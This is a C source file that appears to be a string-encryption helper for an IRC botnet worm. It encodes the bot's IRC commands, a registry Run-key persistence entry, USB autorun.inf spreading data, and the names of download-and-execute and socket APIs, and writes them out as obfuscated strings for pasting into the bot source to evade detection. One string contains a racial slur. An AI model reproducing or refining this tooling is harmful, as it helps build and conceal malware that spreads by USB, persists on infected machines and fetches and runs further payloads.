#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <tchar.h>

char *Encode_Decode(unsigned char *string, unsigned char *key)
{
	unsigned int i, j;

	for (i = 0; i < strlen(string); i++)
	{
		for (j = 0; j < strlen(key); j++)
			string[i] ^= key[j];

		string[i] = ~ string[i];
	}

	return string;
}

/* not really encryption, but keeps "stupid" people from knowing your cmds */
char* Reverse_Str(char* str)
{
    char *temp, *ptr;
    int len, i;

    temp=str;
    for(len=0; *temp !='\0';temp++, len++);

    ptr=malloc(sizeof(char)*(len+1));

    for(i=len-1; i>=0; i--)
        ptr[len-i-1]=str[i];

    ptr[len]='\0';
    return ptr;
}

char *strCryptDecrypt (char *InputString, char *psword , int Method) /* CryptDecrypt(input,ps,1/0) 0=decrypt 1=encrypt */
{
   long LengOfString = strlen (InputString);
   long LengOfps = strlen (psword);
   long PossitionOfps = 0;

   char * buffer = {0};
   /*buffer = new char[LengOfString + 1];*/
   buffer = malloc(LengOfString +1);
   buffer[LengOfString] = 0;

   long i = 0;
   for (i; i < LengOfString; i++)
   {
      if (PossitionOfps >= LengOfps)
      {
         PossitionOfps = 0;
      }
      else
      {
          PossitionOfps++;
      }


      if (Method == 1)
      {
            buffer[i] = InputString[i] + psword[PossitionOfps];
      }
      else
      {
         buffer[i] = InputString[i] - psword[PossitionOfps];
      }
   }
   return buffer;
}

int main()
{

char *ps = "666";

    char *chan          = "#test";
    char *chanps      = "test";
    char *authost       = "test";
  char exename[]              = "test.exe";
    char regkey[]               = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    char regname[]              = "test";
    char open[]                 = "open";
    char *key13 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char my_usragent[] = "test";
   char *NewInstall_Host = "";

    char rcmsg[] = "reconecting";
    char qtmsg[] = "Removing from Node.";
    char wgerr[] = "error";
    char wgrm[] = "removin da file nigga";
char dld[] = "Downloaded:";
char ns[] = "Failed to run file:";
char rng[] = "File running:";
char rdpcmd[] = "rdp.cmd";
char USB_STR_RECYCLER[]   =		"\\RECYCLER";
char USB_STR_REC_SUBDIR[]   =		"\\fire";
char USB_STR_DESKTOP_INI[]   =		"\\Desktop.ini";
char USB_STR_AUTORUN_INF[]   =		"\\AUTORUN.inf";
char USB_STR_AUTORUN_DATA1[]   =	"[autorun]\r\nopen=";
char USB_STR_AUTORUN_DATA2[]   =	"\r\nicon=%SystemRoot%\\system32\\SHELL32.dll,4\r\naction=Open folder to view files\r\nshell\\open=Open\r\nshell\\open\\command=";
char USB_STR_AUTORUN_DATA3[]   =	"\r\nshell\\open\\default=1";
char USB_STR_FILENAME[]   =		"test.exe";

    char cmd__rcl[]          = "main.recon";  /* main.recon */
    char cmd__REMOVAL[]            = "main.removal"; /* main.removal */
    char cmd__jn[]               = "main.jn"; /* main.jn */
    char cmd__pt[]               = "main.pt"; /* main. pt */

    /* IRC */
    char str_nk[]                = "nick";
    char str_usr[]                = "user";
    char str_s4y[]             = "privmsg";
    char str_ntc[]              = "notice";
    char str_ps[]                = "pass";
    char str_jn[]                = "join";
    char str_pt[]                = "part";
    char str_qt[]                = "quit";
    char str_ping[]                = "PING";
    char str_pong[]                = "PONG";
    char str_my_443[]              = "443";
    char str_my_332[]              = "332";

    /* Shell32.dll */
    char shell32_[]             = "shell32.dll";
    char ShellExecute_[]        = "ShellExecuteA";

    /* Advapi32.dll */
    char advapi32_[]            = "Advapi32.dll";
    char RegCreateKeyEx_[]      = "RegCreateKeyExA";
    char RegSetValueEx_[]       = "RegSetValueExA";
    char RegCloseKey_[]         = "RegCloseKey";

    /* WS2_32.dll */
    char WS2_32[]              = "WS2_32.dll";
    char WSACleanup[]          = "WSACleanup";
    char WSAStartup[]          = "WSAStartup";
    char closesocket[]         = "closesocket";
    char connect[]             = "connect";
    char gethostbyname[]       = "gethostbyname";
    char htons[]               = "htons";
    char recv[]                = "recv";
    char send[]                = "send";
    char socket[]              = "socket";
    char inet_addr[]           = "inet_addr";
    char select[]              = "select";

    /*UrlMon.dll */
    char urlmon[]              = "urlmon.dll";
    char URLDownloadToFile[]   = "URLDownloadToFileA";

    char *str_nk2,*str_usr2,*str_s4y2,*str_ntc2,*str_ps2,*str_jn2,*str_pt2,*str_qt2,*str_ping2,*str_pong2,*str_my_443_2,*str_my_332_2;
    char *shell32_2, *ShellExecute_2, *advapi32_2, *RegCreateKeyEx_2, *RegSetValueEx_2, *RegCloseKey_2;
    char *WS2_32_2, *WSACleanup_2, *WSAStartup_2, *closesocket_2, *connect_2, *gethostbyname_2, *htons_2, *recv_2, *send_2, *socket_2, *inet_addr_2, *select_2;
    char *urlmon_2, *URLDownloadToFile_2;
    char *cmd__jn_2, *cmd__pt_2, *cmd__rcl_2, *cmd__REMOVAL_2;
  char *lol_chan, *lol_chanps, *lol_authost, *lol_exename, *lol_regkey, *lol_regname, *lol_open, *lol_key13;
   char *lol_my_usragent, *lol_NewInstall_Host, *lol_rcmsg, *lol_qtmsg, *lol_wgerr, *lol_wgrm;
    char  *lol_dld, *lol_ns, *lol_rng, *lol_rdpcmd, *lol_USB_STR_RECYCLER, *lol_USB_STR_REC_SUBDIR, *lol_USB_STR_DESKTOP_INI, *lol_USB_STR_AUTORUN_INF;
   char *lol_USB_STR_AUTORUN_DATA1, *lol_USB_STR_AUTORUN_DATA2;
    char *lol_USB_STR_AUTORUN_DATA3, *lol_USB_STR_FILENAME;
     FILE *myFile = fopen("encrypted_strings.txt", "w");

     if ( myFile )
     {
     fprintf(myFile,"********NOTE********\n");
     fprintf(myFile,"*MAKE SURE YOU COPY + PASTE \nTHIS TO THE TOP OF\nTHE \"cryptn.c\" FILE!!! -Carve\n");
     fprintf(myFile,"********NOTE********\n\n\n");

     /* ENCRYPTION KEY */
     fprintf(myFile,"/* ENCRYPTION KEY */\n");
     fprintf(myFile,"char decode_ps[] = \"%s\";\n",ps);

     /* COMMANDS */
     cmd__rcl_2 = Encode_Decode(cmd__rcl,ps);
     cmd__REMOVAL_2 = Encode_Decode(cmd__REMOVAL,ps);
     cmd__jn_2 = Encode_Decode(cmd__jn,ps);
     cmd__pt_2 = Encode_Decode(cmd__pt,ps);

     /* IRC */
     str_nk2      = Encode_Decode(str_nk,ps);
     str_usr2      = Encode_Decode(str_usr,ps);
     str_s4y2   = Encode_Decode(str_s4y,ps);
     str_ntc2    = Encode_Decode(str_ntc,ps);
     str_ps2      = Encode_Decode(str_ps,ps);
     str_jn2      = Encode_Decode(str_jn,ps);
     str_pt2      = Encode_Decode(str_pt,ps);
     str_qt2      = Encode_Decode(str_qt,ps);
     str_ping2      = Encode_Decode(str_ping,ps);
     str_pong2      = Encode_Decode(str_pong,ps);
     str_my_443_2   = Encode_Decode(str_my_443,ps);
     str_my_332_2   = Encode_Decode(str_my_332,ps);
   lol_chan =   Encode_Decode(chan,ps);
    lol_chanps  =   Encode_Decode(chanps,ps);
    lol_authost =   Encode_Decode(authost,ps);
    lol_rcmsg = Encode_Decode(rcmsg,ps);
    lol_exename = Encode_Decode(exename,ps);
    lol_regkey = Encode_Decode(regkey,ps);
    lol_regname = Encode_Decode(regname,ps);
    lol_open = Encode_Decode(open,ps);
    lol_key13 = Encode_Decode(key13,ps);
    lol_NewInstall_Host = Encode_Decode(NewInstall_Host,ps);
    lol_my_usragent = Encode_Decode(my_usragent,ps);
    lol_qtmsg = Encode_Decode(qtmsg,ps);
    lol_rdpcmd = Encode_Decode(rdpcmd,ps);
    lol_wgerr = Encode_Decode(wgerr,ps);
    lol_wgrm = Encode_Decode(wgrm,ps);
    lol_dld = Encode_Decode(dld,ps);
    lol_ns  = Encode_Decode(ns,ps);
    lol_rng = Encode_Decode(rng,ps);
    lol_USB_STR_RECYCLER = Encode_Decode(USB_STR_RECYCLER,ps);
    lol_USB_STR_REC_SUBDIR = Encode_Decode(USB_STR_REC_SUBDIR,ps);
    lol_USB_STR_DESKTOP_INI = Encode_Decode(USB_STR_DESKTOP_INI,ps);
    lol_USB_STR_AUTORUN_INF = Encode_Decode(USB_STR_AUTORUN_INF,ps);
    lol_USB_STR_AUTORUN_DATA1 = Encode_Decode(USB_STR_AUTORUN_DATA1,ps);
    lol_USB_STR_AUTORUN_DATA2 = Encode_Decode(USB_STR_AUTORUN_DATA2,ps);
    lol_USB_STR_AUTORUN_DATA3 = Encode_Decode(USB_STR_AUTORUN_DATA3,ps);
    lol_USB_STR_FILENAME = Encode_Decode(USB_STR_FILENAME,ps);

     /* DLLS\APIS */
     shell32_2      = strCryptDecrypt(shell32_,ps,1);
     ShellExecute_2 = strCryptDecrypt(ShellExecute_,ps,1);

     advapi32_2     = strCryptDecrypt(advapi32_,ps,1);
     RegCreateKeyEx_2 = strCryptDecrypt(RegCreateKeyEx_,ps,1);
     RegSetValueEx_2= strCryptDecrypt(RegSetValueEx_,ps,1);
     RegCloseKey_2  = strCryptDecrypt(RegCloseKey_,ps,1);

     WS2_32_2       = strCryptDecrypt(WS2_32,ps,1);
     WSACleanup_2   = strCryptDecrypt(WSACleanup,ps,1);
     WSAStartup_2   = strCryptDecrypt(WSAStartup,ps,1);
     closesocket_2  = strCryptDecrypt(closesocket,ps,1);
     connect_2      = strCryptDecrypt(connect,ps,1);
     gethostbyname_2= strCryptDecrypt(gethostbyname,ps,1);
     htons_2        = strCryptDecrypt(htons,ps,1);
     recv_2         = strCryptDecrypt(recv,ps,1);
     send_2         = strCryptDecrypt(send,ps,1);
     socket_2       = strCryptDecrypt(socket,ps,1);
     select_2       = strCryptDecrypt(select,ps,1);
     inet_addr_2    = strCryptDecrypt(inet_addr,ps,1);

     urlmon_2       = strCryptDecrypt(urlmon,ps,1);
     URLDownloadToFile_2 = strCryptDecrypt(URLDownloadToFile,ps,1);

     fprintf(myFile,"/* COMMANDS */\n");
     fprintf(myFile,"char cmd__rcl[]       = \"%s\"; /* main.recon */\n",        cmd__rcl_2);
     fprintf(myFile,"char cmd__REMOVAL[]         = \"%s\"; /* main.removal */\n",      cmd__REMOVAL_2);
     fprintf(myFile,"char cmd__jn[]            = \"%s\"; /* main.jn */\n",         cmd__jn_2);
     fprintf(myFile,"char cmd__pt[]            = \"%s\"; /* main.pt */\n",         cmd__pt_2);

     fprintf(myFile,"/* IRC */\n");
     fprintf(myFile,"char my_nk[]              = \"%s\";\n",      str_nk2);
     fprintf(myFile,"char my_usr[]              = \"%s\";\n",    str_usr2);
     fprintf(myFile,"char my_s4y[]           = \"%s\";\n", str_s4y2);
     fprintf(myFile,"char my_ntc[]            = \"%s\";\n",  str_ntc2);
     fprintf(myFile,"char my_ps[]              = \"%s\";\n",    str_ps2);
     fprintf(myFile,"char my_jn[]              = \"%s\";\n",    str_jn2);
     fprintf(myFile,"char my_pt[]              = \"%s\";\n",    str_pt2);
     fprintf(myFile,"char my_qt[]              = \"%s\";\n",    str_qt2);
     fprintf(myFile,"char my_P1N6[]              = \"%s\";\n",    str_ping2);
     fprintf(myFile,"char my_P0N6[]              = \"%s\";\n",    str_pong2);
     fprintf(myFile,"char my_4_4_3[]             = \"%s\";\n",     str_my_443_2);
     fprintf(myFile,"char my_3_3_2[]             = \"%s\";\n\n",     str_my_332_2);

     fprintf(myFile,"/* Shell32.dll */\n");
     fprintf(myFile,"char shell32_[]              = \"%s\";\n", shell32_2);
     fprintf(myFile,"char ShellExecute_[]         = \"%s\";\n\n", ShellExecute_2);

     fprintf(myFile,"/* Advapi32.dll */\n");
     fprintf(myFile,"char advapi32_[]             = \"%s\";\n", advapi32_2);
     fprintf(myFile,"char RegCreateKeyEx_[]       = \"%s\";\n", RegCreateKeyEx_2);
     fprintf(myFile,"char RegSetValueEx_[]        = \"%s\";\n", RegSetValueEx_2);
     fprintf(myFile,"char RegCloseKey_[]          = \"%s\";\n\n", RegCloseKey_2);


     fprintf(myFile,"/* WS2_32.DLL */\n");
     fprintf(myFile,"char WS2_32_[]              = \"%s\";\n",      WS2_32_2);
     fprintf(myFile,"char WSACleanup_[]          = \"%s\";\n",      WSACleanup_2);
     fprintf(myFile,"char WSAStartup_[]          = \"%s\";\n",      WSAStartup_2);
     fprintf(myFile,"char closesocket_[]         = \"%s\";\n",      closesocket_2);
     fprintf(myFile,"char connect_[]             = \"%s\";\n",      connect_2);
     fprintf(myFile,"char gethostbyname_[]       = \"%s\";\n",      gethostbyname_2);
     fprintf(myFile,"char htons_[]               = \"%s\";\n",      htons_2);
     fprintf(myFile,"char recv_[]                = \"%s\";\n",      recv_2);
     fprintf(myFile,"char send_[]                = \"%s\";\n",      send_2);
     fprintf(myFile,"char socket_[]              = \"%s\";\n",      socket_2);
     fprintf(myFile,"char select_[]              = \"%s\";\n",      select_2);
     fprintf(myFile,"char inet_addr_[]           = \"%s\";\n\n",    inet_addr_2);

     fprintf(myFile,"/*UrlMon.DLL */\n");
     fprintf(myFile,"char urlmon_[]              = \"%s\";\n",      urlmon_2);
     fprintf(myFile,"char URLDownloadToFile_[]   = \"%s\";\n",      URLDownloadToFile_2);

     fprintf(myFile,"char *chan                  = \"%s\";\n", lol_chan);
     fprintf(myFile,"char *chanps                = \"%s\";\n", lol_chanps);
     fprintf(myFile,"char *authost               = \"%s\";\n", lol_authost);
     fprintf(myFile,"char exename[]            = \"%s\";\n", lol_exename);
     fprintf(myFile,"char regkey[]           = \"%s\";\n", lol_regkey);
     fprintf(myFile,"char regname[]          = \"%s\";\n", lol_regname);
     fprintf(myFile,"char open[]             = \"%s\";\n", lol_open);
     fprintf(myFile,"char *key13              = \"%s\";\n", lol_key13);
     fprintf(myFile,"char my_usragent[] = \"%s\";\n", lol_my_usragent);
     fprintf(myFile,"char *NewInstall_Host = \"%s\";\n", lol_NewInstall_Host);

     fprintf(myFile,"char rcmsg[] = \"%s\";\n", lol_rcmsg);
     fprintf(myFile,"char qtmsg[] = \"%s\";\n", lol_qtmsg);
     fprintf(myFile,"char wgerr[] = \"%s\";\n", lol_wgerr);
     fprintf(myFile,"char wgrm[] = \"%s\";\n", lol_wgrm);
     fprintf(myFile,"char dld[] = \"%s\";\n", lol_dld);
     fprintf(myFile,"char ns[] = \"%s\";\n", lol_ns);
     fprintf(myFile,"char rng[] = = \"%s\";\n", lol_rng);
     fprintf(myFile,"char rdpcmd[] = \"%s\";\n", lol_rdpcmd);
     fprintf(myFile,"char USB_STR_RECYCLER[]   = \"%s\";\n", lol_USB_STR_RECYCLER);
     fprintf(myFile,"char USB_STR_REC_SUBDIR[]   == \"%s\";\n", lol_USB_STR_REC_SUBDIR);
     fprintf(myFile,"char USB_STR_DESKTOP_INI[] = \"%s\";\n", lol_USB_STR_DESKTOP_INI);
     fprintf(myFile,"char USB_STR_AUTORUN_INF[] = \"%s\";\n", lol_USB_STR_AUTORUN_INF);
     fprintf(myFile,"char USB_STR_AUTORUN_DATA1[]   = \"%s\";\n",lol_USB_STR_AUTORUN_DATA1);
     fprintf(myFile,"char USB_STR_AUTORUN_DATA2[]   = \"%s\";\n",lol_USB_STR_AUTORUN_DATA2);
     fprintf(myFile,"char USB_STR_AUTORUN_DATA3[]   = \"%s\";\n",lol_USB_STR_AUTORUN_DATA3);
     fprintf(myFile,"char USB_STR_FILENAME[]    = \"%s\";\n/n", lol_USB_STR_FILENAME);

     fclose(myFile);
     return 0;
}
     return 1;
}
